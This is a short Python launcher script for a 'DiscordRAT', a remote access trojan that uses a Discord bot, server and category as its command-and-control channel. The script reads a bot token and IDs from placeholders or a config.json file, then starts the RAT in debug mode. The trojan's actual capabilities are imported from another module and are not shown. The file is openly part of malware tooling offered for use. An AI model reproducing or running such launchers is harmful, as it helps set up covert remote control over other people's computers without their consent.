import os.path as path, json
from shell.main import DiscordRAT

config = {
    "discordToken": "YOUR_TOKEN_HERE",
    "serverID": "YOUR_SERVER_ID",
    "categoryID": "YOUR_CATEGORY_ID"
}

if path.exists("config.json"):
    with open("config.json") as f: config = json.loads(f.read())

RAT = DiscordRAT(
    config["serverID"],
    config["categoryID"],
    debugMode=True
)

RAT.run(config["discordToken"])